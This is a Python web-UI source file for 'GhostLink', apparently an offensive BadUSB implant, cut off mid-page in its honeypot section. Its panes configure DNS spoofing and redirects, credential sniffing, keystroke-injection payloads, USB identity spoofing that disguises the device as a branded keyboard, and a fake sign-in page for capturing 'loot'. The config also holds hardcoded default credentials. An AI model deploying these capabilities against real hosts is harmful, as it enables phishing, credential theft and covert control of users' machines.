#!/usr/bin/env python3
"""
GhostLink Web UI — ported to the ESP-S3-Key-BadUSB visual language.

Palette: material green (#4CAF50) primary on near-black glass; same radial
glow + glass-card + green-accent-border system used across QWavey's own
BadUSB stack, so GhostLink reads as part of the same toolkit.

Panes: live / records / query / config / hid / system.

Also: when REDIRECT=TRUE, this server inspects the Host header. If the
request comes in for a hostname in REDIRECT_FROM, we return 302 to
REDIRECT_TO (dnsmasq already steered the A record here). That lets a real
browser visit a spoofed domain and get redirected without needing a
separate :8080 forwarder.
"""

import fcntl
import http.server
import json
import os
import pty
import re
import secrets
import select
import signal
import socketserver
import struct
import subprocess
import sys
import termios
import threading
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs

ROOT       = Path(os.environ.get("GL_ROOT", "/root/ghostlink"))
CFG_PATH   = ROOT / "config.txt"
REC_DIR    = ROOT / "records"
VER_DIR    = ROOT / "verdicts"
PAY_DIR    = ROOT / "payloads"       # scripts library
EXT_DIR    = ROOT / "extensions"     # reusable DuckyScript includes
LAY_DIR    = ROOT / "layouts"        # keyboard layouts
ID_ENV     = ROOT / "identity.env"   # clone-identity override (sourced by S50)
HONEY_DIR  = ROOT / "honeypot"       # honeypot assets + captured loot
HONEY_HTML = HONEY_DIR / "index.html"
HONEY_LOOT = HONEY_DIR / "loot.jsonl"
LOG_PATH   = ROOT / "logs" / "ghostlink.log"
STATS_PATH = Path("/tmp/ghostlink.stats.json")
LEASE_PATH = Path("/tmp/dnsmasq.leases")

# -------- session store (web-cli auth) --------------------------------------
# Memory-only token table: {token: expiry_ts}. Lost on webui restart (that is
# the correct behavior — a reboot forces re-auth). CLI endpoints MUST have an
# authed session. Script/config/live endpoints are open on the trusted RNDIS
# subnet (same model as everything else here).
SESSIONS = {}
SESSION_TTL = 3600                   # 1 hour
SESSION_LOCK = threading.Lock()

# Rate-limit login attempts per source IP to blunt brute force.
LOGIN_ATTEMPTS = {}                  # {ip: [t1, t2, ...]}
LOGIN_MAX = 10                       # per 60s


def _session_new(user: str) -> str:
    tok = secrets.token_urlsafe(32)
    with SESSION_LOCK:
        SESSIONS[tok] = (user, time.time() + SESSION_TTL)
    return tok


def _session_valid(tok: str) -> str:
    if not tok: return ""
    expired_now = False
    with SESSION_LOCK:
        v = SESSIONS.get(tok)
        if not v: return ""
        user, exp = v
        if time.time() > exp:
            del SESSIONS[tok]
            expired_now = True
        else:
            # sliding window: refresh on each use
            SESSIONS[tok] = (user, time.time() + SESSION_TTL)
    if expired_now:
        # kill the per-session pty so it doesn't leak forever
        pty_close(tok)
        return ""
    return user


def _session_drop(tok: str):
    with SESSION_LOCK:
        SESSIONS.pop(tok, None)


def _login_throttled(ip: str) -> bool:
    now = time.time()
    with SESSION_LOCK:
        hist = [t for t in LOGIN_ATTEMPTS.get(ip, []) if now - t < 60]
        LOGIN_ATTEMPTS[ip] = hist
        return len(hist) >= LOGIN_MAX


def _login_record(ip: str):
    with SESSION_LOCK:
        LOGIN_ATTEMPTS.setdefault(ip, []).append(time.time())

# Script-library filename rule: ascii word-chars, dash, dot, underscore.
# No slashes, no ..  Length 1..64. One of a few allowed extensions.
SCRIPT_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.(ducky|txt|sh|dd)$")

# -------- pty-backed shell per session --------------------------------------
# A real terminal keeps state across commands (cwd, env, exported vars,
# interactive readers). We spawn one `sh` child per authed session, pipe cmds
# in via the pty master fd, and read whatever comes back until the output
# goes quiet. Session TTL + explicit logout close the child.

PTY_SHELLS = {}  # {token: {"pid":..., "fd":..., "lock":Lock, "lastread":ts, "buf":str}}
PTY_LOCK   = threading.Lock()

def _pty_strip_ansi(s: str) -> str:
    # Drop ANSI CSI / OSC and lonely CR for cleaner web output.
    s = re.sub(r"\x1b\[[0-?]*[ -/]*[@-~]", "", s)
    s = re.sub(r"\x1b\][^\x07]*\x07", "", s)
    return s.replace("\r\n", "\n").replace("\r", "")


def pty_open(token: str) -> dict:
    """Open a persistent sh session for this token (or return existing)."""
    with PTY_LOCK:
        s = PTY_SHELLS.get(token)
        if s and s.get("pid"):
            # verify alive
            try: os.kill(s["pid"], 0)
            except OSError:
                try: os.close(s["fd"])
                except Exception: pass
                PTY_SHELLS.pop(token, None)
                s = None
        if not s:
            pid, fd = pty.fork()
            if pid == 0:
                os.chdir("/root")
                os.environ["PS1"] = "$ "
                os.environ["TERM"] = "dumb"
                try:
                    os.execvp("sh", ["sh"])
                except Exception:
                    os._exit(1)
            # set winsize so programs that query TIOCGWINSZ don't trip
            try:
                fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", 40, 120, 0, 0))
            except Exception: pass
            fcntl.fcntl(fd, fcntl.F_SETFL, os.O_NONBLOCK)
            s = {"pid": pid, "fd": fd, "lock": threading.Lock(), "lastread": 0.0}
            PTY_SHELLS[token] = s
            # drain any initial prompt output so the first user command isn't
            # prefixed with it
            try:
                time.sleep(0.1)
                while True:
                    r, _, _ = select.select([fd], [], [], 0.1)
                    if not r: break
                    os.read(fd, 4096)
            except Exception: pass
        return s


def pty_close(token: str):
    with PTY_LOCK:
        s = PTY_SHELLS.pop(token, None)
    if s:
        try: os.kill(s["pid"], signal.SIGTERM)
        except Exception: pass
        try: os.close(s["fd"])
        except Exception: pass


def pty_run(token: str, cmd: str, timeout: float = 15.0) -> dict:
    """Send cmd to the token's shell, return captured output cleaned up."""
    s = pty_open(token)
    fd = s["fd"]
    with s["lock"]:
        # drain anything stale first (prior async output / lingering prompt)
        try:
            while True:
                r, _, _ = select.select([fd], [], [], 0)
                if not r: break
                os.read(fd, 4096)
        except Exception: pass

        # Sentinel so we can detect end-of-command without parsing a prompt.
        marker = "__GL_END_" + secrets.token_hex(6) + "__"
        # printf prints the marker on its OWN new line and the rc. We echo
        # with no leading space on the printf line so the shell's ECHO of
        # that line is a predictable string we can scrub.
        probe = f"printf '\\n{marker} rc=%d\\n' $?"
        payload = f"{cmd}\n{probe}\n"
        try:
            os.write(fd, payload.encode())
        except OSError as e:
            return {"out": "", "err": f"write: {e}", "rc": -1}

        buf = b""
        rc_val = None
        done = False
        start = time.time()
        while time.time() - start < timeout and not done:
            r, _, _ = select.select([fd], [], [], 0.1)
            if r:
                try:
                    chunk = os.read(fd, 8192)
                    if not chunk:
                        done = True; break
                    buf += chunk
                    # Normalize line endings for the match (pty converts \n to
                    # \r\n on echo — the previous regex failed because of this).
                    text_so_far = buf.decode("utf-8", "replace").replace("\r\n", "\n").replace("\r", "")
                    m = re.search(re.escape(marker) + r" rc=(\d+)\n", text_so_far)
                    if m:
                        # Second occurrence is the printed one (the first is
                        # the echoed probe line) — but the regex is non-greedy,
                        # so it finds the first. We want the LAST match.
                        for m2 in re.finditer(re.escape(marker) + r" rc=(\d+)\n", text_so_far):
                            m = m2
                        rc_val = int(m.group(1))
                        buf = text_so_far[:m.start()].encode("utf-8", "replace")
                        done = True
                except OSError:
                    done = True; break

        text = buf.decode("utf-8", "replace").replace("\r\n", "\n").replace("\r", "")
        text = _pty_strip_ansi(text)
        # Drop the echoed probe line itself (contains the marker name).
        text = re.sub(r"[^\n]*" + re.escape(marker) + r"[^\n]*\n?", "", text)
        # Drop a leading echoed user command (shell echoes before running).
        if text.startswith(cmd + "\n"):
            text = text[len(cmd) + 1:]
        # Strip a lonely "$ " prompt at the end.
        text = re.sub(r"\n?\$\s*$", "", text)
        # Collapse trailing whitespace.
        text = text.rstrip() + ("\n" if text.strip() else "")

    return {
        "out": text[-64*1024:],
        "err": "",
        "rc":  rc_val if rc_val is not None else -1,
        "timeout": not done,
    }


# ---- canonical default config.txt ------------------------------------------
# POST /api/config/defaults rewrites config.txt to this. Keeps the user's
# device_name and hostname if they were customized.
DEFAULT_CONFIG = """\
# GhostLink on-device config
HOSTNAME=ghostlink
DEVICE_NAME=WebBee-Ghost-01
ENABLE_HID=TRUE
SNIFF_IFACE=usb0
LOG=TRUE
RECORD_PCAP=TRUE
RECORD_ROTATE_KB=1024
RECORD_RING_FILES=4
VERDICT_STREAM=TRUE
VERDICT_RING_FILES=10
RECORD_MAX_AGE_H=24
RECORD_MIN_FREE_MB=10
WEBUI=TRUE
WEBUI_PORT=80
WEBUI_BIND=0.0.0.0
WEBUI_USER=root
WEBUI_PASS=ghostlink
DNSMASQ=TRUE
DNSMASQ_IFACE=usb0
DHCP_RANGE=172.32.0.100,172.32.0.120,255.255.0.0,12h
DNS_UPSTREAM=1.1.1.1,9.9.9.9
REDIRECT=FALSE
REDIRECT_FROM=
REDIRECT_TO=http://example.com
REDIRECT_PRESERVE_PATH=TRUE
DNS_SPOOF=FALSE
DNS_SPOOF_HOSTS=
HID_LAYOUT=us
HID_PAYLOAD=
HID_DELAY_MS=1500
LOG_LEVEL=INFO
BUTTON_ENABLED=TRUE
BUTTON_DEV=/dev/input/event0
BUTTON_PAYLOAD=
BUTTON_DOUBLE_TAP_PAYLOAD=
BUTTON_HOLD_PAYLOAD=
BUTTON_TAP_WINDOW_MS=600
BUTTON_HOLD_MS=1200
NET_MODE=PASSIVE
LIVESAVE=TRUE
HONEYPOT=FALSE
HONEYPOT_IP=172.32.0.254
HONEYPOT_REDIRECT_AFTER=
HONEYPOT_RULES=
"""


def load_cfg():
    cfg = {}
    if not CFG_PATH.exists(): return cfg
    for ln in CFG_PATH.read_text().splitlines():
        s = ln.strip()
        if not s or s.startswith("#") or "=" not in s: continue
        k, v = s.split("=", 1)
        # Strip inline comments only when preceded by whitespace — otherwise a
        # `#` inside a password or URL fragment silently truncates the value.
        m = re.search(r"\s#", v)
        if m: v = v[:m.start()]
        cfg[k.strip()] = v.strip()
    return cfg


# ====== HTML ================================================================
HTML = r"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GhostLink | WebBee Control</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<link rel="stylesheet" href="/style.css">
</head>
<body>
<div class="container">
  <h1>GHOSTLINK</h1>
  <div class="subtitle">WebBee passthrough &middot; record &middot; react</div>

  <nav class="tab" role="tablist">
    <button class="tablinks active" data-tab="Live">Live</button>
    <button class="tablinks"        data-tab="Records">Records</button>
    <button class="tablinks"        data-tab="Query">Query</button>
    <button class="tablinks"        data-tab="Config">Config</button>
    <button class="tablinks"        data-tab="Scripting">Scripting</button>
    <button class="tablinks"        data-tab="LiveType">Live Type</button>
    <button class="tablinks"        data-tab="Clone">Clone</button>
    <button class="tablinks"        data-tab="Honeypot">Honeypot</button>
    <button class="tablinks"        data-tab="Terminal">Terminal</button>
    <button class="tablinks"        data-tab="System">System</button>
  </nav>

  <!-- Disk pressure banner (shown by JS when warn_level > 0) -->
  <div id="warnBanner" class="warn-banner" style="display:none;"></div>

  <!-- =========== LIVE =========== -->
  <section id="tab-Live" class="tabcontent" style="display:block">
    <div class="flex-row" style="justify-content: space-between; align-items: center;">
      <h3>Live Monitor</h3>
      <div class="flex-row" style="gap:10px;">
        <button id="btnStream" onclick="toggleStream()" class="btn-ghost">&hellip;</button>
        <button id="btnRec" onclick="toggleRecord()" class="btn-ghost">&hellip;</button>
        <button id="btnClear" onclick="clearRecordsLive()" class="btn-ghost" title="wipe records+verdicts without stopping recording">Clear records</button>
        <div id="recBadge" class="status-badge">REC OFF</div>
      </div>
    </div>

    <!-- Network mode segmented toggle. "Forwarded" is only available when
         a LAN cable is actually plugged into eth0 (carrier=1); until then
         it's rendered but disabled with a hint. -->
    <div class="section" style="padding:12px 16px;">
      <div class="flex-row" style="justify-content:space-between; align-items:center; gap:14px; flex-wrap:wrap;">
        <div class="flex-row" style="gap:0;">
          <button id="modePassive" onclick="setNetMode('PASSIVE')" class="seg-btn seg-left">
            Passive traffic
          </button>
          <button id="modeForward" onclick="setNetMode('FORWARD')" class="seg-btn seg-right">
            Forwarded traffic
          </button>
        </div>
        <div class="flex-row" style="gap:12px;">
          <span class="link-badge" id="lnkUsb">usb0 &hellip;</span>
          <span class="link-badge" id="lnkEth">eth0 &hellip;</span>
        </div>
      </div>
      <div class="dim" style="font-size:12px; margin-top:8px;" id="modeHint">
        Passive = sniff only what the host sends via usb0.
        Forwarded = cross-copy frames between eth0 and usb0 (needs a cable).
      </div>
    </div>

    <div class="stat-grid">
      <div class="stat"><label>packets / sec</label><div class="val" id="s-pps">0</div></div>
      <div class="stat"><label>matches / sec</label><div class="val match" id="s-mps">0</div></div>
      <div class="stat"><label>frames total</label>  <div class="val" id="s-frames">0</div></div>
      <div class="stat"><label>matches total</label> <div class="val match" id="s-matches">0</div></div>
      <div class="stat"><label>disk free</label>     <div class="val" id="s-disk">-</div></div>
      <div class="stat"><label>uptime</label>        <div class="val" id="s-uptime">-</div></div>
    </div>

    <div class="section">
      <h4>Verdict Tail <span class="dim">(last 50 frames)</span></h4>
      <div class="table-wrap">
        <table class="t-verdicts">
          <thead><tr>
            <th>frame</th><th>t</th><th>flow</th><th>sz</th><th>rule</th><th>host / detail</th>
          </tr></thead>
          <tbody id="verdicts-body"><tr><td colspan="6" class="dim">waiting&hellip;</td></tr></tbody>
        </table>
      </div>
    </div>

    <div class="section">
      <h4>Interfaces</h4>
      <div class="table-wrap">
        <table class="t-ifaces">
          <thead><tr>
            <th>name</th><th>state</th><th>ipv4</th><th>mac</th>
            <th>rx pkts</th><th>rx bytes</th><th>tx pkts</th><th>tx bytes</th>
          </tr></thead>
          <tbody id="ifaces-body"><tr><td colspan="8" class="dim">&hellip;</td></tr></tbody>
        </table>
      </div>
    </div>
  </section>

  <!-- =========== RECORDS =========== -->
  <section id="tab-Records" class="tabcontent">
    <div class="flex-row" style="justify-content: space-between; align-items: center;">
      <h3>Records on <code>/root/ghostlink</code></h3>
      <div class="flex-row" style="gap:10px;">
        <button onclick="refreshRecords()">Refresh</button>
        <button class="danger" onclick="clearAll()">Clear ALL</button>
      </div>
    </div>
    <div class="section">
      <div id="rec-summary" class="dim" style="margin-bottom:12px;">&hellip;</div>
      <div class="table-wrap">
        <table class="t-records">
          <thead><tr><th>name</th><th>size</th><th>modified</th><th>actions</th></tr></thead>
          <tbody id="records-body"><tr><td colspan="4" class="dim">&hellip;</td></tr></tbody>
        </table>
      </div>
    </div>
  </section>

  <!-- =========== QUERY =========== -->
  <section id="tab-Query" class="tabcontent">
    <h3>Query Verdict Stream</h3>
    <div class="section">
      <p class="dim" style="font-size:13px;">
        The verdict stream is a JSONL side-channel written next to every pcap.
        Filter by host (substring, case-insensitive) and/or rule type.
      </p>
      <div class="setting-row flex-row" style="gap:12px; flex-wrap: wrap;">
        <input type="text" id="q-host" placeholder="host  (example.com)" class="flex-grow">
        <input type="text" id="q-rule" placeholder="rule  (DNS | REDIRECT | CRED)" style="min-width:200px;">
        <button onclick="qCreds()" class="btn-ghost">Show only CRED</button>
        <button onclick="runQuery()">Run</button>
      </div>
      <div id="q-result-rule" class="dim" style="margin-top:14px;">no query run yet</div>
    </div>
    <div class="section">
      <div class="table-wrap">
        <table class="t-verdicts">
          <thead><tr>
            <th>frame</th><th>t</th><th>flow</th><th>sz</th><th>rule</th><th>host / detail</th>
          </tr></thead>
          <tbody id="query-body"></tbody>
        </table>
      </div>
    </div>
  </section>

  <!-- =========== CONFIG =========== -->
  <section id="tab-Config" class="tabcontent">
    <div class="flex-row" style="justify-content: space-between; align-items: center;">
      <h3>Config</h3>
      <div class="flex-row" style="gap:10px;">
        <button onclick="cfgReload()">Reload</button>
        <button onclick="cfgSave()">Save</button>
        <button onclick="applyStandard()" class="btn-ghost">Apply standard</button>
        <label class="sw" style="margin-left:14px;">
          <input type="checkbox" id="cfgAdv" onchange="cfgToggleAdvanced()">
          <span>Advanced (raw)</span>
        </label>
      </div>
    </div>

    <!-- form view (default) ------------------------------------------- -->
    <div id="cfgForm">
      <div class="section">
        <h4>Core</h4>
        <div class="cfg-grid">
          <div class="cfg-row sw-row"><label>Live-save switches</label>
            <label class="sw"><input type="checkbox" data-k="LIVESAVE" checked><span class="slider"></span></label>
            <span class="dim" style="font-size:11px;">auto-save a switch the moment you flip it</span>
          </div>
          <div class="cfg-row"><label>Device name</label><input data-k="DEVICE_NAME"></div>
          <div class="cfg-row"><label>Hostname</label><input data-k="HOSTNAME"></div>
          <div class="cfg-row sw-row"><label>Enable HID</label>
            <label class="sw"><input type="checkbox" data-k="ENABLE_HID"><span class="slider"></span></label>
            <span class="dim" style="font-size:11px;">reboot after flip</span>
          </div>
          <div class="cfg-row"><label>WebUI port</label><input data-k="WEBUI_PORT" type="number" min="1" max="65535"></div>
          <div class="cfg-row"><label>WebUI user</label><input data-k="WEBUI_USER"></div>
          <div class="cfg-row"><label>WebUI pass</label><input data-k="WEBUI_PASS" type="password"></div>
          <div class="cfg-row"><label>HID layout</label><input data-k="HID_LAYOUT" placeholder="us"></div>
        </div>
      </div>

      <div class="section">
        <h4>Sniffer / Recording</h4>
        <div class="cfg-grid">
          <div class="cfg-row sw-row"><label>Logging on</label>
            <label class="sw"><input type="checkbox" data-k="LOG"><span class="slider"></span></label>
          </div>
          <div class="cfg-row sw-row"><label>Record PCAP</label>
            <label class="sw"><input type="checkbox" data-k="RECORD_PCAP"><span class="slider"></span></label>
          </div>
          <div class="cfg-row sw-row"><label>Verdict stream</label>
            <label class="sw"><input type="checkbox" data-k="VERDICT_STREAM"><span class="slider"></span></label>
          </div>
          <div class="cfg-row"><label>Sniff iface</label><input data-k="SNIFF_IFACE" placeholder="usb0 / eth0"></div>
          <div class="cfg-row"><label>Rotate (KB)</label><input data-k="RECORD_ROTATE_KB" type="number"></div>
          <div class="cfg-row"><label>Ring files (pcap)</label><input data-k="RECORD_RING_FILES" type="number"></div>
          <div class="cfg-row"><label>Ring files (verdict)</label><input data-k="VERDICT_RING_FILES" type="number"></div>
          <div class="cfg-row"><label>Max age (h)</label><input data-k="RECORD_MAX_AGE_H" type="number"></div>
          <div class="cfg-row"><label>Min free (MB)</label><input data-k="RECORD_MIN_FREE_MB" type="number"></div>
        </div>
      </div>

      <div class="section">
        <h4>Button</h4>
        <div class="cfg-grid">
          <div class="cfg-row sw-row"><label>Button enabled</label>
            <label class="sw"><input type="checkbox" data-k="BUTTON_ENABLED"><span class="slider"></span></label>
          </div>
          <div class="cfg-row"><label>Button device</label><input data-k="BUTTON_DEV" placeholder="/dev/input/event0"></div>
          <div class="cfg-row"><label>Single-tap payload</label><input data-k="BUTTON_PAYLOAD" placeholder="hello.ducky"></div>
          <div class="cfg-row"><label>Double-tap payload</label><input data-k="BUTTON_DOUBLE_TAP_PAYLOAD" placeholder="(optional)"></div>
          <div class="cfg-row"><label>Hold payload</label><input data-k="BUTTON_HOLD_PAYLOAD" placeholder="(optional)"></div>
          <div class="cfg-row"><label>Tap window (ms)</label><input data-k="BUTTON_TAP_WINDOW_MS" type="number"></div>
          <div class="cfg-row"><label>Hold threshold (ms)</label><input data-k="BUTTON_HOLD_MS" type="number"></div>
        </div>
      </div>

      <div class="section">
        <h4>DHCP / DNS</h4>
        <div class="cfg-grid">
          <div class="cfg-row sw-row"><label>dnsmasq on</label>
            <label class="sw"><input type="checkbox" data-k="DNSMASQ"><span class="slider"></span></label>
          </div>
          <div class="cfg-row"><label>DHCP range</label><input data-k="DHCP_RANGE"></div>
          <div class="cfg-row"><label>DNS upstream</label><input data-k="DNS_UPSTREAM"></div>
          <div class="cfg-row"><label>DNS mode iface</label><input data-k="DNSMASQ_IFACE"></div>
        </div>
      </div>

      <div class="section">
        <h4>Redirect</h4>
        <div class="cfg-grid">
          <div class="cfg-row sw-row"><label>Redirect on</label>
            <label class="sw"><input type="checkbox" data-k="REDIRECT"><span class="slider"></span></label>
          </div>
          <div class="cfg-row sw-row"><label>Preserve path</label>
            <label class="sw"><input type="checkbox" data-k="REDIRECT_PRESERVE_PATH"><span class="slider"></span></label>
          </div>
          <div class="cfg-row"><label>REDIRECT_FROM (csv)</label><input data-k="REDIRECT_FROM"></div>
          <div class="cfg-row"><label>REDIRECT_TO (URL/host)</label><input data-k="REDIRECT_TO"></div>
          <div class="cfg-row sw-row"><label>DNS spoof file on</label>
            <label class="sw"><input type="checkbox" data-k="DNS_SPOOF"><span class="slider"></span></label>
          </div>
          <div class="cfg-row"><label>DNS spoof file path</label><input data-k="DNS_SPOOF_HOSTS"></div>
        </div>
        <div class="setting-row flex-row" style="gap:10px; flex-wrap:wrap; margin-top:12px; padding-top:12px; border-top:1px solid var(--glass-border);">
          <input type="text" id="spoof-host" placeholder="quick-add host (newhost.com)" class="flex-grow">
          <input type="text" id="spoof-to" placeholder="override REDIRECT_TO (optional)" style="min-width:220px;">
          <button onclick="addSpoof()">+ Append &amp; Save</button>
        </div>
      </div>
    </div>

    <!-- raw / advanced view ------------------------------------------- -->
    <div id="cfgRaw" class="section" style="display:none;">
      <h4>Raw config.txt</h4>
      <p class="dim" style="font-size:13px; margin-bottom:10px;">
        Edit every line. Save hot-reloads most keys. <code>ENABLE_HID</code> or
        a USB-mode change still needs a reboot.
      </p>
      <textarea id="cfg" spellcheck="false" wrap="off"
                style="width:100%; min-height:420px;"></textarea>
    </div>
  </section>

  <!-- (HID tab removed — use Scripting pane instead for payload fire) -->

  <!-- =========== SCRIPTING (DuckyScript IDE) =========== -->
  <section id="tab-Scripting" class="tabcontent">
    <div class="flex-row" style="justify-content:space-between; align-items:center;">
      <h3>DuckyScript IDE</h3>
      <div id="scriptStatus" class="dim" style="font-size:12px;">idle</div>
    </div>

    <div class="ide-grid">
      <!-- LEFT: compact sidebar — layout picker, scripts, extensions -->
      <aside class="ide-side">
        <div class="section">
          <h4>Layout</h4>
          <select id="layoutSel" onchange="setLayout(this.value)" style="width:100%; font-size:12px;"></select>
        </div>
        <div class="section">
          <h4>Scripts <span class="dim" id="scriptCount"></span></h4>
          <div class="setting-row flex-row" style="gap:4px; margin-bottom:6px;">
            <input type="text" id="newScriptName" placeholder="name.ducky" style="min-width:0; font-size:12px;" class="flex-grow">
            <button onclick="scriptsNew()" style="padding:6px 10px;">+</button>
          </div>
          <ul id="scriptList" class="file-list"><li class="dim">&hellip;</li></ul>
        </div>
        <div class="section">
          <h4>Extensions <span class="dim" id="extCount"></span></h4>
          <div class="setting-row flex-row" style="gap:4px; margin-bottom:6px;">
            <input type="text" id="newExtName" placeholder="name" style="min-width:0; font-size:12px;" class="flex-grow">
            <button onclick="extsNew()" style="padding:6px 10px;">+</button>
          </div>
          <ul id="extList" class="file-list"><li class="dim">&hellip;</li></ul>
        </div>
      </aside>

      <!-- RIGHT: editor -->
      <main class="ide-main">
        <div class="editor-toolbar flex-row">
          <span id="editorTitle" class="dim">(untitled)</span>
          <span class="spacer"></span>
          <button onclick="scriptRun()" class="btn-run">Run</button>
          <button onclick="scriptStop()" class="btn-ghost">Stop</button>
          <button onclick="scriptSave()" class="btn-save">Save</button>
          <button onclick="scriptSaveAs()" class="btn-ghost">Save as&hellip;</button>
          <button onclick="scriptClear()" class="btn-ghost">Clear</button>
        </div>
        <div class="editor-wrapper" id="editorWrapper">
          <div class="editor-gutter" id="editorGutter">1</div>
          <textarea id="scriptArea" spellcheck="false" placeholder="REM write DuckyScript here&#10;DELAY 500&#10;GUI r&#10;STRING notepad&#10;ENTER&#10;STRING hello" autocomplete="off" autocorrect="off"></textarea>
          <div class="autocomplete-popup" id="acPopup"></div>
        </div>
        <div class="editor-foot flex-row">
          <span id="editorLines">0 lines</span>
          <span class="spacer"></span>
          <span id="editorIssues" class="dim">no issues</span>
        </div>
      </main>
    </div>
  </section>

  <!-- =========== LIVE TYPING (interactive HID) =========== -->
  <section id="tab-LiveType" class="tabcontent">
    <h3>Live Typing <span class="dim" style="font-size:12px;">(interactive HID)</span></h3>
    <div class="section">
      <p class="dim" style="font-size:13px;">
        Focus the textarea below. Every key you press is sent to the host as a
        single HID report. Modifiers (shift/ctrl/alt/gui) and special keys
        (enter/tab/esc/backspace/arrows/F-keys) are forwarded as well. The
        target host sees it as a wireless keyboard.
      </p>
      <div class="flex-row" style="justify-content:space-between; align-items:center;">
        <span class="sw-inline">
          <label class="sw">
            <input type="checkbox" id="liveEn" checked>
            <span class="slider"></span>
          </label>
          <span>Live typing enabled</span>
        </span>
        <span id="liveStatus" class="dim" style="font-size:12px;">armed</span>
      </div>
      <textarea id="liveInput" spellcheck="false"
                placeholder="click here, then every keypress is sent to the host"
                style="width:100%; min-height:220px; margin-top:12px;"
                autocomplete="off" autocorrect="off"></textarea>
      <div class="flex-row" style="gap:8px; margin-top:12px; flex-wrap:wrap;">
        <button onclick="liveSendSpecial('ENTER')" class="btn-ghost">Enter</button>
        <button onclick="liveSendSpecial('TAB')" class="btn-ghost">Tab</button>
        <button onclick="liveSendSpecial('ESC')" class="btn-ghost">Esc</button>
        <button onclick="liveSendSpecial('BACKSPACE')" class="btn-ghost">Back</button>
        <button onclick="liveSendCombo('GUI','r')" class="btn-ghost">Win+R</button>
        <button onclick="liveSendCombo('CTRL','c')" class="btn-ghost">Ctrl+C</button>
        <button onclick="liveSendCombo('CTRL','v')" class="btn-ghost">Ctrl+V</button>
        <button onclick="liveSendCombo('CTRL','ALT','DELETE')" class="btn-ghost">Ctrl+Alt+Del</button>
        <span class="spacer"></span>
        <button onclick="document.getElementById('liveInput').value=''" class="btn-ghost">Clear local text</button>
      </div>
    </div>
  </section>

  <!-- =========== CLONE (USB identity override) =========== -->
  <section id="tab-Clone" class="tabcontent">
    <h3>Clone USB identity</h3>
    <div class="section">
      <p class="dim" style="font-size:13px;">
        Override the gadget's VID/PID + descriptor strings so the device
        enumerates to the host as something else — a specific brand of
        USB-Ethernet adapter, a known keyboard, whatever. Changes take
        effect on <b>next reboot</b> (live rebind is the brick path on this
        kernel — see <code>docs/HID.md</code>). Clear fields and save to
        remove the override and go back to the stock Rockchip identity.
      </p>
      <div class="cfg-grid">
        <div class="cfg-row"><label>Vendor ID (hex)</label><input id="idVid" placeholder="0x2207"></div>
        <div class="cfg-row"><label>Product ID (hex)</label><input id="idPid" placeholder="0x0019"></div>
        <div class="cfg-row"><label>Manufacturer</label><input id="idMfr" placeholder="Rockchip"></div>
        <div class="cfg-row"><label>Product name</label><input id="idProd" placeholder="rk3xxx"></div>
        <div class="cfg-row"><label>Serial</label><input id="idSer" placeholder="(leave blank = auto)"></div>
      </div>
      <div class="flex-row" style="gap:10px; margin-top:12px;">
        <button onclick="idSave()" class="btn-save">Save (takes effect on reboot)</button>
        <button onclick="idClear()" class="btn-ghost">Clear override</button>
        <button onclick="idReboot()" class="danger">Save &amp; reboot now</button>
      </div>
      <div id="idStatus" class="dim" style="margin-top:10px;font-size:12px;">loading&hellip;</div>
    </div>
    <div class="section">
      <h4>Known-good identities</h4>
      <p class="dim" style="font-size:12px;">One click fills the form. Save or Reboot to apply.</p>
      <div class="flex-row" style="gap:6px; flex-wrap:wrap;">
        <button class="btn-ghost" onclick="idPreset('0x2207','0x0019','Rockchip','rk3xxx','')">Stock Rockchip</button>
        <button class="btn-ghost" onclick="idPreset('0x05ac','0x024f','Apple Inc.','Magic Keyboard','')">Apple Keyboard</button>
        <button class="btn-ghost" onclick="idPreset('0x046d','0xc31c','Logitech','USB Keyboard','')">Logitech Keyboard</button>
        <button class="btn-ghost" onclick="idPreset('0x0bda','0x8153','Realtek','USB 3.0 LAN','')">Realtek USB-Ethernet</button>
        <button class="btn-ghost" onclick="idPreset('0x0781','0x5591','SanDisk','Cruzer Glide','')">SanDisk USB drive</button>
      </div>
    </div>

    <div class="section">
      <h4>Connected hosts <span class="dim" style="font-size:12px;">(from DHCP leases)</span></h4>
      <p class="dim" style="font-size:12px;">
        Any PC that got an IP from the WebBee's dnsmasq shows up here.
        Clicking <b>Clone</b> on a row picks a credible USB identity
        matching that host's vendor (Apple/Microsoft/Lenovo/…), writes it
        to <code>identity.env</code>, and takes effect on next boot. Plug
        the device into a different PC afterwards and it enumerates as
        the cloned brand.
      </p>
      <div class="table-wrap">
        <table class="t-verdicts">
          <thead><tr>
            <th>hostname</th><th>ip</th><th>mac</th>
            <th>vendor</th><th>os guess</th><th>&nbsp;</th>
          </tr></thead>
          <tbody id="hostsBody"><tr><td colspan="6" class="dim">loading&hellip;</td></tr></tbody>
        </table>
      </div>
      <div class="flex-row" style="gap:8px; margin-top:8px;">
        <button class="btn-ghost" onclick="hostsRefresh()">Refresh</button>
      </div>
    </div>

    <div class="section">
      <h4>Network state</h4>
      <div class="stat-grid">
        <div class="stat"><label>Internet</label>    <div class="val" id="netInternet">?</div></div>
        <div class="stat"><label>via</label>         <div class="val" id="netVia">-</div></div>
        <div class="stat"><label>latency</label>     <div class="val" id="netLatency">-</div></div>
        <div class="stat"><label>eth0 / usb0</label> <div class="val" id="netLinks">-</div></div>
      </div>
      <div class="flex-row" style="gap:8px; margin-top:8px;">
        <button class="btn-ghost" onclick="netProbe()">Check now</button>
      </div>
    </div>
  </section>

  <!-- =========== HONEYPOT =========== -->
  <section id="tab-Honeypot" class="tabcontent">
    <h3>Honeypot <span class="dim" style="font-size:12px;">(fake sign-in + loot capture)</span></h3>

    <!-- Big "this is the honeypot IP" banner — the device assigns a
         dedicated secondary IP on usb0 so the trap lives at its own URL
         and the admin dashboard stays untouched on .93. -->
    <div class="section" id="hpUrlBanner" style="border-left:4px solid var(--primary); padding-left:14px;">
      <div class="flex-row" style="justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
        <div>
          <div class="dim" style="font-size:12px;">Honeypot URL</div>
          <div style="font-family: ui-monospace, Menlo, monospace; font-size:20px; font-weight:600;">
            <a id="hpUrlLink" href="#" target="_blank">—</a>
          </div>
          <div class="dim" style="font-size:11px; margin-top:4px;" id="hpUrlNote">
            The device binds this address as a secondary IP on usb0.
            Any PC in the same /16 can hit it directly; a trapped host
